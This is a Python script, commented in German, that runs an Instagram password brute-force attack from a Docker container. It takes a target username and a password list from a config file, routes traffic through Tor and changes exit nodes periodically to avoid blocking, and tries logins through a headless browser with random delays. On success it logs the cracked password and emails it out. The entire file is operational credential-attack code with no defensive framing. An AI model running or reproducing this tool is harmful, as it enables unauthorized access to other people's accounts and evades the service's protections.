#!/usr/bin/env python3
"""
Docker Runner - Haupteinstiegspunkt für die Bruteforce-App im Docker-Container
Liest Konfiguration aus config.json und führt das Instagram-Bruteforce-Skript aus.
"""

import os
import sys
import json
import logging
import time
import subprocess
from pathlib import Path

# Importiere die App-Module
from instahack import (
    instagram_login_via_browser,
    load_passwords,
    wait_random,
    is_ip_anonymous,
    get_public_ip
)
from browser.session import BrowserSession
from proxy.tor_proxy import TorProxy
from email_notifier import EmailNotifier

# Logging Setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('/app/logs/bruteforce.log')
    ]
)
logger = logging.getLogger(__name__)


def load_config(config_path: str = "/app/config.json") -> dict:
    """Lädt die Konfigurationsdatei"""
    if not os.path.exists(config_path):
        logger.error(f"Konfigurationsdatei nicht gefunden: {config_path}")
        sys.exit(1)

    try:
        with open(config_path, 'r', encoding='utf-8') as f:
            config = json.load(f)
        logger.info(f"Konfiguration geladen: {config_path}")
        return config
    except json.JSONDecodeError as e:
        logger.error(f"Fehler beim Parsen der JSON-Konfiguration: {e}")
        sys.exit(1)


def ensure_tor_running(tor: TorProxy) -> bool:
    """Stellt sicher, dass Tor läuft"""
    logger.info("Starte Tor-Dienst...")
    try:
        # Starte Tor als Hintergrund-Prozess
        result = subprocess.run(
            ["service", "tor", "start"],
            capture_output=True,
            text=True,
            timeout=10
        )
        if result.returncode != 0:
            logger.warning(f"Tor Start-Befehl hatte Exit-Code {result.returncode}")
        
        # Warte, bis Tor verbunden ist
        for attempt in range(30):
            if tor.is_tor_running():
                logger.info("Tor läuft und ist bereit.")
                return True
            logger.debug(f"Tor noch nicht bereit, Versuch {attempt + 1}/30...")
            time.sleep(1)
        
        logger.error("Tor konnte nicht gestartet werden oder ist nicht bereit.")
        return False
    except Exception as e:
        logger.error(f"Fehler beim Starten von Tor: {e}")
        return False


def main():
    """Hauptfunktion"""
    logger.info("=" * 80)
    logger.info("Bruteforce-Anwendung gestartet (Docker Mode)")
    logger.info("=" * 80)

    # Lade Konfiguration
    config = load_config()
    username = config.get("instagram_username")
    password_list_path = config.get("password_list_path", "/app/passwords.txt")

    if not username or username == "target_username_here":
        logger.error("Instagram-Benutzername in config.json nicht gesetzt!")
        sys.exit(1)

    if not os.path.exists(password_list_path):
        logger.error(f"Passwortliste nicht gefunden: {password_list_path}")
        logger.info(f"Bitte erstelle eine Datei {password_list_path} mit Passwörtern (eines pro Zeile)")
        sys.exit(1)

    # Initialisiere Email-Benachrichtiger
    email_notifier = EmailNotifier(config)

    # Initialisiere Tor
    logger.info("Initialisiere Tor-Proxy...")
    tor = TorProxy()

    if not ensure_tor_running(tor):
        logger.error("Tor konnte nicht gestartet werden. Beende.")
        sys.exit(1)

    # Starte Browser
    logger.info("Starte Browser-Session...")
    session = BrowserSession(tor_proxy=tor, headless=config.get("browser", {}).get("headless", True))
    if not session.start():
        logger.error("Browser konnte nicht gestartet werden.")
        sys.exit(1)

    # Hole und logge öffentliche IP
    get_public_ip()

    # Lade Passwortliste
    try:
        passwords = load_passwords(password_list_path)
    except Exception as e:
        logger.error(f"Fehler beim Laden der Passwortliste: {e}")
        session.close()
        sys.exit(1)

    # Bruteforce Loop
    logger.info(f"Starte Bruteforce gegen Benutzer '{username}' mit {len(passwords)} Passwörtern")
    logger.info("=" * 80)

    for idx, password in enumerate(passwords, start=1):
        logger.info(f"[{idx}/{len(passwords)}] Versuche Passwort: {password}")

        # Ändere Tor Exit-Node regelmäßig
        if idx % config.get("tor", {}).get("change_identity_interval", 5) == 0:
            logger.info("Wechsle Tor Exit-Node...")
            if not tor.new_identity():
                logger.warning("Tor Identity Wechsel fehlgeschlagen, versuche weiterzumachen...")
            time.sleep(5)

        # Versuche Login
        try:
            success = instagram_login_via_browser(session, username, password)
            if success:
                logger.warning("=" * 80)
                logger.warning(f"✓ ERFOLG! Passwort geknackt!")
                logger.warning(f"Username: {username}")
                logger.warning(f"Password: {password}")
                logger.warning("=" * 80)

                # Sende Email-Benachrichtigung
                if email_notifier.enabled:
                    logger.info("Versende Email-Benachrichtigung...")
                    email_notifier.send_success_notification(username, password)

                session.close()
                sys.exit(0)
            else:
                logger.info("Login fehlgeschlagen, nächster Versuch...")

        except Exception as e:
            logger.error(f"Fehler bei Login-Versuch: {e}")
            logger.info("Weiter mit nächstem Passwort...")

        # Zufällige Wartezeit
        wait_random()

    # Alle Passwörter probiert
    logger.warning("=" * 80)
    logger.warning("Alle Passwörter wurden versucht, aber keines war erfolgreich.")
    logger.warning("=" * 80)
    session.close()
    sys.exit(1)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.info("Benutzer hat den Prozess abgebrochen.")
        sys.exit(130)
    except Exception as e:
        logger.error(f"Unerwarteter Fehler: {e}", exc_info=True)
        sys.exit(1)
